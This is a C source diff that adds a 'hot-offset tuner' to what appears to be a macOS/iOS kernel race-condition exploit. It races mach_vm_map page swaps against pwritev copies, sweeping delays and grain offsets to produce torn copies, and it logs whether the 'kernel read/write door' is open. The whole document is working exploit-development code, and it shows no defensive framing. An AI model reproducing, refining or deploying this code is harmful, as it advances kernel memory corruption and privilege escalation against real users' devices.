@@ -307,6 +307,7 @@ static CFNumberRef RCNUM(int64_t v) {
     uint64_t flM0=0, flC=0, flW=0, flF=0, flZ=0, flP=0;
     int dumped = 0;
     int failErrno[16] = {0};
+    uint64_t rc_hotOffs[32]; uint32_t rc_hotN = 0;
 
     for (uint32_t start = 0; start + 1 < npages; start += RC_STRIDE) {
         mach_vm_offset_t off = (mach_vm_offset_t)start * vm_page_size;
@@ -365,6 +366,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 case C_ZERO: (*bZ)++; break;
                 case C_PARTIAL:
                     (*bP)++;
+                    if (rc_hotN < 32) { int dup = 0; for (uint32_t hi = 0; hi < rc_hotN; hi++) if (rc_hotOffs[hi] == (uint64_t)off) { dup = 1; break; } if (!dup) rc_hotOffs[rc_hotN++] = (uint64_t)off; }
                     if (dumped < 6) {
                         rc_log("  PARTIAL %s off=0x%llx q0=0x%llx q1=0x%llx q-1=0x%llx w=%zd",
                                isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], rbBuf[RC_NQ-1], w);
@@ -387,6 +389,52 @@ static CFNumberRef RCNUM(int64_t v) {
     rc_sprayGo = 0;
     pthread_join(th, NULL);
     pthread_join(thSpray, NULL);
+
+    /* ---- v9 HOT-OFFSET TUNER (partial→wrong/foreign bias) ----
+       The 9 named PARTIAL offsets are torn-copy windows: the swap completed
+       BETWEEN copy grains. The tuner races them DENSELY with a SPLIT swap:
+       the swap thread maps only the crossing half, the main thread completes
+       the rest after a swept delay — the kernel's pwritev copy now straddles
+       a mid-swap state. WRONG/FOREIGN here = the socket-KRW door condition. */
+    {
+        rc_log("--- v9 HOT TUNER: %u hot offsets, split-swap delay sweep, dense race ---",
+               rc_hotN);
+        uint64_t hw=0, hf=0, hp=0, hr=0;
+        const uint32_t offList[3] = { 0x3c00, 0x3e00, 0x3f00 };  /* boundary grain widths */
+        for (uint32_t ho = 0; ho < rc_hotN; ho++) {
+            uint64_t off = rc_hotOffs[ho];
+            for (int g = 0; g < 3; g++) {
+                for (uint32_t dl = 0; dl <= 8; dl++) {
+                    useconds_t us = dl ? (1u << (dl - 1)) : 0;
+                    mach_vm_address_t a = pcBig;
+                    mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                    memset_pattern8((void *)pcBig, &m0, 0x8000);
+                    pwrite(fdMark, zreset, sizeof(zreset), offList[g]);
+                    struct iovec iov2 = { (void *)(pcBig + offList[g]), 0x4000 };
+                    rc_mapAddr = pcBig; rc_mapSize = 0x4000;  /* swap HALF */
+                    rc_mapObj = searchObj; rc_mapOff = off;
+                    rc_raceOn = 1;
+                    ssize_t w = pwritev(fdMark, &iov2, 1, offList[g]);
+                    (void)w;
+                    if (us) usleep(us);
+                    mach_vm_address_t a2 = pcBig;   /* complete second half inline */
+                    mach_vm_map(mach_task_self(), &a2, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+                    rc_raceOn = 0;
+                    pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                    uint64_t got = 0; int32_t delta = 0;
+                    rc_cls_t cc = rc_cls(rbBuf, 0, npages, &got, &delta);
+                    if (cc == C_WRONG) { hw++; if (hr < 8) { rc_log("  v9 WRONG hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
+                    else if (cc == C_FOREIGN) { hf++; if (hr < 8) { rc_log("  v9 FOREIGN hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
+                    else if (cc == C_PARTIAL) hp++;
+                    else hr += 0;
+                }
+            }
+        }
+        rc_log("v9 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (WRONG/FOREIGN = cskrw door OPEN)",
+               hw, hf, hp);
+    }
 
     rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
     rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
